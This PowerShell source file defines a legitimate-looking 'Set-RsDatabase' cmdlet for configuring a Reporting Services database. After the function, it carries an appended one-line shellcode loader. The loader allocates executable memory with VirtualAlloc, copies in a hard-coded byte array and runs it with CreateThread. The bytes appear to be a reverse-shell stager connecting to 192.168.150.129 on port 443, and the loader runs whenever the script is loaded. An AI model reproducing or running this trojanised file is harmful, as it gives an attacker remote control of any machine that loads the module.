



function Set-RsDatabase
{
    

    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
    param (
        [Parameter(Mandatory = $True)]
        [string]
        $DatabaseServerName,

        [switch]
        $IsRemoteDatabaseServer,

        [Parameter(Mandatory = $True)]
        [Alias('DatabaseName')]
        [string]
        $Name,

        [switch]
        $IsExistingDatabase,

        [Parameter(Mandatory = $true)]
        [Alias('Authentication')]
        [Microsoft.ReportingServicesTools.SqlServerAuthenticationType]
        $DatabaseCredentialType,

        [System.Management.Automation.PSCredential]
        $DatabaseCredential,

        [Microsoft.ReportingServicesTools.SqlServerAuthenticationType]
        $AdminDatabaseCredentialType,

        [System.Management.Automation.PSCredential]
        $AdminDatabaseCredential,

        [Alias('SqlServerInstance')]
        [string]
        $ReportServerInstance,

        [Alias('SqlServerVersion')]
        [Microsoft.ReportingServicesTools.SqlServerVersion]
        $ReportServerVersion,

        [string]
        $ComputerName,

        [System.Management.Automation.PSCredential]
        $Credential
    )

    if ($PSCmdlet.ShouldProcess((Get-ShouldProcessTargetWmi -BoundParameters $PSBoundParameters), "Configure to use $DatabaseServerName as database, using $DatabaseCredentialType runtime authentication and $AdminDatabaseCredentialType setup authentication"))
    {
        $rsWmiObject = New-RsConfigurationSettingObjectHelper -BoundParameters $PSBoundParameters

        
        $username = ''
        $password = $null
        if ($DatabaseCredentialType -like 'serviceaccount')
        {
            $username = $rsWmiObject.WindowsServiceIdentityActual
            $password = ''
        }

        else
        {
            if ($DatabaseCredential -eq $null)
            {
                throw "No Database Credential specified! Database credential must be specified when configuring $DatabaseCredentialType authentication."
            }
            $username = $DatabaseCredential.UserName
            $password = $DatabaseCredential.GetNetworkCredential().Password
        }
        

        
        $adminUsername = ''
        $adminPassword = $null

        
        $isSQLAdminAccount = ($AdminDatabaseCredentialType -like "SQL")

        
        if ($AdminDatabaseCredentialType -like 'serviceaccount')
        {
            throw "Can only use Admin Database Credentials Type of 'Windows' or 'SQL'"
        }

        
        if ($isSQLAdminAccount)
        {
            if ($AdminDatabaseCredential -eq $null)
            {
                throw "No Admin Database Credential specified! Admin Database credential must be specified when configuring $AdminDatabaseCredentialType authentication."
            }
            $adminUsername = $AdminDatabaseCredential.UserName
            $adminPassword = $AdminDatabaseCredential.GetNetworkCredential().Password
        }
        


        
        if (-not $IsExistingDatabase)
        {
            
            Write-Verbose "Generating database creation script..."
            $EnglishLocaleId = 1033
            $IsSharePointMode = $false
            $result = $rsWmiObject.GenerateDatabaseCreationScript($Name, $EnglishLocaleId, $IsSharePointMode)
            if ($result.HRESULT -ne 0)
            {
                Write-Verbose "Generating database creation script... Failed!"
                throw "Failed to generate the database creation script from the report server using WMI. Errorcode: $($result.HRESULT)"
            }
            else
            {
                $SQLScript = $result.Script
                Write-Verbose "Generating database creation script... Complete!"
            }

            
            Write-Verbose "Executing database creation script..."
            try
            {
                if ($isSQLAdminAccount)
                {
                    Invoke-Sqlcmd -ServerInstance $DatabaseServerName -Query $SQLScript -ErrorAction Stop -Username $adminUsername -Password $adminPassword
                }
                else
                {
                    Invoke-Sqlcmd -ServerInstance $DatabaseServerName -Query $SQLScript -ErrorAction Stop
                }
            }
            catch
            {
                Write-Verbose "Executing database creation script... Failed!"
                throw
            }
            Write-Verbose "Executing database creation script... Complete!"
        }
        

        
        
        Write-Verbose "Generating database rights script..."
        $isWindowsAccount = ($DatabaseCredentialType -like "Windows") -or ($DatabaseCredentialType -like "ServiceAccount")
        $result = $rsWmiObject.GenerateDatabaseRightsScript($username, $Name, $IsRemoteDatabaseServer, $isWindowsAccount)
        if ($result.HRESULT -ne 0)
        {
            Write-Verbose "Generating database rights script... Failed!"
            throw "Failed to generate the database rights script from the report server using WMI. Errorcode: $($result.HRESULT)"
        }
        else
        {
            $SQLscript = $result.Script
            Write-Verbose "Generating database rights script... Complete!"
        }

        
        Write-Verbose "Executing database rights script..."
        try
        {
            if ($isSQLAdminAccount)
            {
                Invoke-Sqlcmd -ServerInstance $DatabaseServerName -Query $SQLScript -ErrorAction Stop -Username $adminUsername -Password $adminPassword
            }
            else
            {
                Invoke-Sqlcmd -ServerInstance $DatabaseServerName -Query $SQLScript -ErrorAction Stop
            }
        }
        catch
        {
            Write-Verbose "Executing database rights script... Failed!"
            throw
        }
        Write-Verbose "Executing database rights script... Complete!"
        

        
        
        Write-Verbose "Updating Reporting Services to connect to new database..."
        $result = $rsWmiObject.SetDatabaseConnection($DatabaseServerName, $Name, $DatabaseCredentialType.Value__, $username, $password)
        if ($result.HRESULT -ne 0)
        {
            Write-Verbose "Updating Reporting Services to connect to new database... Failed!"
            throw "Failed to update the reporting services to connect to the new database using WMI! Errorcode: $($result.HRESULT)"
        }
        else
        {
            Write-Verbose "Updating Reporting Services to connect to new database... Complete!"
        }
        
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

